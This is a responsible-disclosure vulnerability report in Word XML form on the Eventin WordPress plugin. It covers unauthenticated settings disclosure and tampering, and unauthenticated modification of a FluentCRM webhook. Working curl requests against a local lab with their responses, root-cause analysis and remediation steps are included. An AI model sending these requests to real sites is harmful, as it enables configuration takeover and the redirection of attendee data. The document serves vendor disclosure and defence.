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2B4D"/>
          <w:sz w:val="44"/>
        </w:rPr>
        <w:t>Vulnerability Report — Eventin (wp-event-solution)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Unauthenticated Settings Takeover (REST) + Unauthenticated Webhook Configuration Modification (REST)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Report metadata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Unauthenticated settings disclosure + settings tampering, and webhook configuration modification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Eventin – Event Manager, Event Booking, Calendar, Tickets and Registration Plugin (AI Powered)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>WordPress.org URL</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>https://wordpress.org/plugins/wp-event-solution/</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Plugin slug</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>wp-event-solution</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>Tested version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4320"/>
          </w:tcPr>
          <w:p>
            <w:r>
              <w:t>4.0.51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Local WordPress (Docker), Apache/2.4.65 (Debian), PHP 8.3.29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&lt;YOUR NAME / HANDLE&gt;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2025-12-30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Issue 1: High; Issue 2: Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Ethics / scope note: </w:t>
      </w:r>
      <w:r>
        <w:t>All testing described below was performed against a local, authorized test environment.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="172B4D"/>
        </w:rPr>
        <w:t>Executive summary</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Two REST API endpoints exposed by Eventin allow unauthenticated users to (1) read and modify plugin settings stored in the WordPress option 'etn_event_options' and (2) modify an event’s FluentCRM webhook URL stored in post meta 'fluent_crm_webhook'. The combination enables configuration takeover and potential sensitive-data exfiltration.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="172B4D"/>
        </w:rPr>
        <w:t>Issue 1: Unauthenticated Settings Disclosure + Settings Tampering (REST)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Affected endpoints:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>GET  /index.php?rest_route=/eventin/v1/event/settings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>POST /index.php?rest_route=/eventin/v1/event/settings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="172B4D"/>
        </w:rPr>
        <w:t>Evidence (local lab)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A) Database evidence (before)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SELECT option_value</w:t>
        <w:br/>
        <w:t>FROM wp_options</w:t>
        <w:br/>
        <w:t>WHERE option_name = 'etn_event_options';</w:t>
        <w:br/>
        <w:br/>
        <w:t>option_value (before):</w:t>
        <w:br/>
        <w:t>a:34:{s:24:"etn_does_demo_data_exits";b:1;s:7:"_locale";s:4:"user";s:10:"wc_enabled";b:0;s:14:"payment_method";s:0:"";s:14:"plugin_version";s:6:"4.0.51";s:7:"modules";b:0;s:18:"zoom_authorize_url";s:125:"https://zoom.us/oauth/authorize?response_type=code&amp;redirect_uri=http://localhost:8080/eventin-integration/zoom-auth&amp;client_id";s:18:"event_url_editable";b:0;s:5:"email";a:5:{i:0;b:0;s:14:"purchase_email";a:5:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:12:"Event Ticket";s:4:"body";s:69:"You have purchased ticket(s). Attendee ticket details are as follows.";s:13:"send_to_admin";b:1;s:23:"send_email_to_attendees";b:1;}s:17:"certificate_email";a:4:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:17:"Event Certificate";s:4:"body";s:191:"&lt;p&gt;Congratulations for successfully attending/completing the event '&lt;span&gt;{%event_title%}&lt;/span&gt;'. Your certificate is ready! Click on the link provided below to get the PDF certificate. &lt;/p&gt;";s:13:"send_to_admin";b:1;}s:9:"rsv_email";a:5:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:13:"response_type";s:5:"going";s:7:"subject";s:12:"RSVP request";s:4:"body";s:29:"We received your RSVP request";s:13:"send_to_admin";b:1;}s:14:"reminder_email";a:4:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:14:"Reminder email";s:4:"body";s:219:"Just sending you a quick reminder about our retailer meet-up you've registered to attend in two days time. If you've misplaced the Invitation that contained all the details. don't worry. Cve added them rn below for you.";s:13:"send_to_admin";b:1;}}s:29:"etn_settings_country_currency";s:3:"USD";s:17:"decimal_separator";s:9:"comma_dot";s:18:"thousand_separator";s:1:",";s:8:"decimals";i:0;s:12:"price_format";s:8:"%1$s%2$s";s:17:"currency_position";s:4:"left";s:20:"wc_order_status_list";a:0:{}s:17:"wc_order_statuses";a:2:{i:0;s:9:"completed";i:1;s:10:"processing";}s:23:"show_ticket_expiry_date";b:0;s:20:"add_to_cart_redirect";s:8:"checkout";s:24:"order_thank_you_redirect";s:12:"woo_thankyou";s:21:"enable_purchase_email";s:2:"on";s:21:"ticket_purchase_timer";i:10;s:28:"ticket_purchase_timer_enable";s:3:"off";s:12:"extra_fields";a:0:{}s:14:"zoom_connected";b:0;s:23:"etn_include_from_search";s:2:"on";s:27:"archive_event_sorting_order";s:3:"ASC";s:17:"etn_primary_color";s:7:"#bf0000";s:21:"attendee_registration";N;s:12:"etn_zoom_api";N;s:18:"etn_groundhogg_api";N;s:17:"etn_googlemap_api";N;s:10:"etn_ai_api";N;s:14:"currencySymbol";s:1:"$";}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>B) Unauthenticated READ (GET)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curl -i "http://localhost:8080/index.php?rest_route=/eventin/v1/event/settings"</w:t>
        <w:br/>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>Date: Tue, 30 Dec 2025 22:13:11 GMT</w:t>
        <w:br/>
        <w:t>Server: Apache/2.4.65 (Debian)</w:t>
        <w:br/>
        <w:t>X-Powered-By: PHP/8.3.29</w:t>
        <w:br/>
        <w:t>X-Robots-Tag: noindex</w:t>
        <w:br/>
        <w:t>Link: &lt;http://localhost:8080/index.php?rest_route=/&gt;; rel="https://api.w.org/"</w:t>
        <w:br/>
        <w:t>X-Content-Type-Options: nosniff</w:t>
        <w:br/>
        <w:t>Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages, Link</w:t>
        <w:br/>
        <w:t>Access-Control-Allow-Headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type</w:t>
        <w:br/>
        <w:t>Allow: GET, POST, PUT, PATCH, DELETE</w:t>
        <w:br/>
        <w:t>Vary: Origin</w:t>
        <w:br/>
        <w:t>Content-Length: 2287</w:t>
        <w:br/>
        <w:t>Content-Type: application/json; charset=UTF-8</w:t>
        <w:br/>
        <w:br/>
        <w:t>{"status_code":0,"messages":[],"date_format_list":["2025-12-30","12/30/2025","30/12/2025","12-30-2025","30-12-2025","2025.12.30","12.30.2025","30.12.2025","30 Dec 2025","30 December 2025"],"content":{"settings":{"etn_does_demo_data_exits":true,"_locale":"user","wc_enabled":false,"payment_method":"","plugin_version":"4.0.51","modules":false,"zoom_authorize_url":"https://zoom.us/oauth/authorize?response_type=code&amp;redirect_uri=http://localhost:8080/eventin-integration/zoom-auth&amp;client_id","event_url_editable":false,"email":{"0":false,"purchase_email":{"from":"marouanefreelance1@gmail.com","subject":"Event Ticket","body":"You have purchased ticket(s). Attendee ticket details are as follows.","send_to_admin":true,"send_email_to_attendees":true},"certificate_email":{"from":"marouanefreelance1@gmail.com","subject":"Event Certificate","body":"&lt;p&gt;Congratulations for successfully attending/completing the event '&lt;span&gt;{%event_title%}&lt;/span&gt;'. Your certificate is ready! Click on the link provided below to get the PDF certificate. &lt;/p&gt;","send_to_admin":true},"rsv_email":{"from":"marouanefreelance1@gmail.com","response_type":"going","subject":"RSVP request","body":"We received your RSVP request","send_to_admin":true},"reminder_email":{"from":"marouanefreelance1@gmail.com","subject":"Reminder email","body":"Just sending you a quick reminder about our retailer meet-up you've registered to attend in two days time. If you've misplaced the Invitation that contained all the details. don't worry. Cve added them rn below for you.","send_to_admin":true}},"etn_settings_country_currency":"USD","decimal_separator":"comma_dot","thousand_separator":",","decimals":0,"price_format":"%1$s%2$s","currency_position":"left","wc_order_status_list":[],"wc_order_statuses":["completed","processing"],"show_ticket_expiry_date":false,"add_to_cart_redirect":"checkout","order_thank_you_redirect":"woo_thankyou","enable_purchase_email":"on","ticket_purchase_timer":10,"ticket_purchase_timer_enable":"off","extra_fields":[],"zoom_connected":false,"etn_include_from_search":"on","archive_event_sorting_order":"ASC","etn_primary_color":"#bf0000","attendee_registration":null,"etn_zoom_api":null,"etn_groundhogg_api":null,"etn_googlemap_api":null,"etn_ai_api":null,"currencySymbol":"$"}}}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C) Unauthenticated WRITE (POST) — change etn_primary_color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curl -i -X POST \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "http://localhost:8080/index.php?rest_route=/eventin/v1/event/settings" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"etn_primary_color":"#00ff00"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>Date: Tue, 30 Dec 2025 22:25:22 GMT</w:t>
        <w:br/>
        <w:t>Server: Apache/2.4.65 (Debian)</w:t>
        <w:br/>
        <w:t>X-Powered-By: PHP/8.3.29</w:t>
        <w:br/>
        <w:t>Allow: GET, POST, PUT, PATCH, DELETE</w:t>
        <w:br/>
        <w:t>Content-Length: 44</w:t>
        <w:br/>
        <w:t>Content-Type: application/json; charset=UTF-8</w:t>
        <w:br/>
        <w:br/>
        <w:t>{"status_code":1,"messages":[],"content":[]}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>D) Unauthenticated WRITE (POST) — change events_per_page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curl -i -X POST \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "http://localhost:8080/index.php?rest_route=/eventin/v1/event/settings" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"events_per_page":1}'</w:t>
        <w:br/>
        <w:br/>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>Date: Tue, 30 Dec 2025 22:29:35 GMT</w:t>
        <w:br/>
        <w:t>Server: Apache/2.4.65 (Debian)</w:t>
        <w:br/>
        <w:t>X-Powered-By: PHP/8.3.29</w:t>
        <w:br/>
        <w:t>Allow: GET, POST, PUT, PATCH, DELETE</w:t>
        <w:br/>
        <w:t>Content-Length: 44</w:t>
        <w:br/>
        <w:t>Content-Type: application/json; charset=UTF-8</w:t>
        <w:br/>
        <w:br/>
        <w:t>{"status_code":1,"messages":[],"content":[]}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>E) Database evidence (after)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SELECT option_value</w:t>
        <w:br/>
        <w:t>FROM wp_options</w:t>
        <w:br/>
        <w:t>WHERE option_name = 'etn_event_options';</w:t>
        <w:br/>
        <w:br/>
        <w:t>option_value (after):</w:t>
        <w:br/>
        <w:t>a:39:{s:24:"etn_does_demo_data_exits";b:1;s:7:"_locale";s:4:"user";s:10:"wc_enabled";b:0;s:14:"payment_method";s:0:"";s:14:"plugin_version";s:6:"4.0.51";s:7:"modules";b:0;s:18:"zoom_authorize_url";s:125:"https://zoom.us/oauth/authorize?response_type=code&amp;redirect_uri=http://localhost:8080/eventin-integration/zoom-auth&amp;client_id";s:18:"event_url_editable";b:0;s:5:"email";a:5:{i:0;b:0;s:14:"purchase_email";a:5:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:12:"Event Ticket";s:4:"body";s:69:"You have purchased ticket(s). Attendee ticket details are as follows.";s:13:"send_to_admin";b:1;s:23:"send_email_to_attendees";b:1;}s:17:"certificate_email";a:4:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:17:"Event Certificate";s:4:"body";s:191:"&lt;p&gt;Congratulations for successfully attending/completing the event '&lt;span&gt;{%event_title%}&lt;/span&gt;'. Your certificate is ready! Click on the link provided below to get the PDF certificate. &lt;/p&gt;";s:13:"send_to_admin";b:1;}s:9:"rsv_email";a:5:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:13:"response_type";s:5:"going";s:7:"subject";s:12:"RSVP request";s:4:"body";s:29:"We received your RSVP request";s:13:"send_to_admin";b:1;}s:14:"reminder_email";a:4:{s:4:"from";s:28:"marouanefreelance1@gmail.com";s:7:"subject";s:14:"Reminder email";s:4:"body";s:219:"Just sending you a quick reminder about our retailer meet-up you've registered to attend in two days time. If you've misplaced the Invitation that contained all the details. don't worry. Cve added them rn below for you.";s:13:"send_to_admin";b:1;}}s:29:"etn_settings_country_currency";s:3:"USD";s:17:"decimal_separator";s:9:"comma_dot";s:18:"thousand_separator";s:1:",";s:8:"decimals";i:0;s:12:"price_format";s:8:"%1$s%2$s";s:17:"currency_position";s:4:"left";s:20:"wc_order_status_list";a:0:{}s:17:"wc_order_statuses";a:2:{i:0;s:9:"completed";i:1;s:10:"processing";}s:23:"show_ticket_expiry_date";b:0;s:20:"add_to_cart_redirect";s:8:"checkout";s:24:"order_thank_you_redirect";s:12:"woo_thankyou";s:21:"enable_purchase_email";s:2:"on";s:21:"ticket_purchase_timer";i:10;s:28:"ticket_purchase_timer_enable";s:3:"off";s:12:"extra_fields";a:0:{}s:14:"zoom_connected";b:0;s:23:"etn_include_from_search";s:2:"on";s:27:"archive_event_sorting_order";s:3:"ASC";s:17:"etn_primary_color";s:0:"";s:21:"attendee_registration";s:0:"";s:12:"etn_zoom_api";N;s:18:"etn_groundhogg_api";N;s:17:"etn_googlemap_api";N;s:10:"etn_ai_api";N;s:14:"currencySymbol";s:1:"$";s:15:"events_per_page";i:1;s:11:"date_format";s:0:"";s:11:"time_format";s:0:"";s:19:"etn_secondary_color";s:0:"";s:12:"sell_tickets";s:0:"";}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="172B4D"/>
        </w:rPr>
        <w:t>Root cause (source code)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1) REST permission callback always returns true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>File: base/api-handler.php — permision_check() returns true, exposing v1 actions at the router level.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2) Server-side nonce injection for settings</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>File: base/api-handler.php — callback() sets X-WP-Nonce to wp_create_nonce('wp_rest') when action == settings.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3) Inverted authorization logic in settings handler</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>File: core/event/api.php — get_settings() and post_settings() allow when user is NOT admin and does NOT have manage_options.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="172B4D"/>
        </w:rPr>
        <w:t>Issue 2: Unauthenticated Webhook Configuration Modification (REST)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Affected endpoint:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>POST /index.php?rest_route=/eventin/v1/event/webhook</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Storage:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Post meta: meta_key = fluent_crm_webhook (per event_id)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="172B4D"/>
        </w:rPr>
        <w:t>Evidence (local lab)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A) OPTIONS response indicates endpoint is reachable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curl -i -X OPTIONS \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "http://localhost:8080/index.php?rest_route=/eventin/v1/event/webhook"</w:t>
        <w:br/>
        <w:br/>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>Date: Tue, 30 Dec 2025 23:14:19 GMT</w:t>
        <w:br/>
        <w:t>Server: Apache/2.4.65 (Debian)</w:t>
        <w:br/>
        <w:t>X-Powered-By: PHP/8.3.29</w:t>
        <w:br/>
        <w:t>Allow: GET, POST, PUT, PATCH, DELETE</w:t>
        <w:br/>
        <w:t>Content-Length: 156</w:t>
        <w:br/>
        <w:t>Content-Type: application/json; charset=UTF-8</w:t>
        <w:br/>
        <w:br/>
        <w:t>{"namespace":"eventin/v1/event","methods":["GET","POST","PUT","PATCH","DELETE"],"endpoints":[{"methods":["GET","POST","PUT","PATCH","DELETE"],"args":[]}]}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>B) POST request (unauthenticated) and observed 200 OK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curl -i -X POST \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "http://localhost:8080/index.php?rest_route=/eventin/v1/event/webhook" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"event_id":8,"fluent_crm_webhook":"https://example.test/webhook"}'</w:t>
        <w:br/>
        <w:br/>
        <w:t>HTTP/1.1 200 OK</w:t>
        <w:br/>
        <w:t>Date: Tue, 30 Dec 2025 23:19:15 GMT</w:t>
        <w:br/>
        <w:t>Server: Apache/2.4.65 (Debian)</w:t>
        <w:br/>
        <w:t>X-Powered-By: PHP/8.3.29</w:t>
        <w:br/>
        <w:t>Allow: GET, POST, PUT, PATCH, DELETE</w:t>
        <w:br/>
        <w:t>Content-Length: 0</w:t>
        <w:br/>
        <w:t>Content-Type: application/json; charset=UTF-8</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>C) Database confirmation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SELECT COUNT(*)</w:t>
        <w:br/>
        <w:t>FROM wp_postmeta</w:t>
        <w:br/>
        <w:t>WHERE post_id = 8</w:t>
        <w:br/>
        <w:t xml:space="preserve">  AND meta_key = 'fluent_crm_webhook';</w:t>
        <w:br/>
        <w:br/>
        <w:t>Observed: COUNT = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="172B4D"/>
        </w:rPr>
        <w:t>Why this matters (data egress path)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Eventin’s FluentCRM webhook integration reads fluent_crm_webhook from post meta and performs an outbound HTTP POST when enabled. If an attacker can change fluent_crm_webhook, they may redirect purchaser/attendee data to attacker-controlled endpoints.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F3F4F6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="111111"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>core/Integrations/Webhook/FluentCRM.php</w:t>
        <w:br/>
        <w:t>- reads: get_post_meta($event_id, 'fluent_crm_webhook', true)</w:t>
        <w:br/>
        <w:t>- sends: wp_remote_post($fluentcrm_webhook, ['body' =&gt; $body])</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="172B4D"/>
        </w:rPr>
        <w:t>Recommended remediation (both issues)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Enforce strict REST permissions at the route level:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Replace permision_check() =&gt; true with capability checks for sensitive actions (settings/webhook).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Do not inject REST nonces server-side for unauthenticated requests.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Fix inverted authorization logic in get_settings()/post_settings().</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- Return 401/403 errors for unauthenticated callers.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Source code references (tested plugin source snapshot):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- base/api-handler.php: nonce injection for settings (lines 51–55) and router permission bypass (lines 70–72).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>- core/event/api.php: get_settings() (lines 192–226) and post_settings() (lines 233–266).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="172B4D"/>
        </w:rPr>
        <w:t>Suggested CVSS v3.1 (indicative)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Issue 1 (settings): AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Issue 2 (webhook): AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (depends on site configuration)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="172B4D"/>
        </w:rPr>
        <w:t>Timeline (template)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>2025-12-30: Issue discovered and validated in local environment.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>YYYY-MM-DD: Report submitted to vendor.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>YYYY-MM-DD: Vendor acknowledgment.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>YYYY-MM-DD: Patch released.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>YYYY-MM-DD: Public disclosure / CVE request (if applicable).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